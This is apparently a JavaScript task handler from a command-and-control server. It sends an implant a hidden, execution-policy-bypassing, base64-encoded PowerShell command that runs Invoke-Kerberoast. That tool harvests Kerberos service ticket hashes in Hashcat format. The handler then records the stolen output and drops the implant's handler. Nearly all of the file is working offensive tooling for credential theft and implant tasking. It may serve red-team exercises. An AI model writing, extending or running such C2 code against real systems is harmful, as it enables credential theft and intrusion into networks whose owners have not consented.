// Invoke-Kerberoast Task Handler
// The operator CLI reads Invoke-Kerberoast.ps1, appends the invocation (with optional domain/user
// filters), UTF-16LE base64 encodes the script, and stores the full
// 'powershell -w hidden -ep bypass -EncodedCommand <b64>' string as 'command'.
export class TaskHandler {
  constructor(task) {
    this.task = task
  }

  getTask = async function (req, res) {
    const { command }  = JSON.parse(this.task.parameters)
    const instruction  = `${this.task.id}:${Buffer.from(command).toString('base64')}`
    const display      = `PS: Invoke-Kerberoast -OutputFormat Hashcat`
    db.prepare(`UPDATE tasks SET display = $display WHERE id = $task_id`)
      .run({ task_id: this.task.id, display })
    this.task.display = display
    res.send(instruction)
  }

  taskIO = async function (req, res) {
    this.task.output       = Buffer.from(req.body, 'base64').toString('utf8')
    this.task.completed_at = Date.now()
    db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
      .run({ task_id: this.task.id, output: this.task.output, completed_at: this.task.completed_at })
    res.type('text/plain').send('success')
    io('task_complete', this.task)
    delete active_implant_handlers[this.task.id]
  }
}
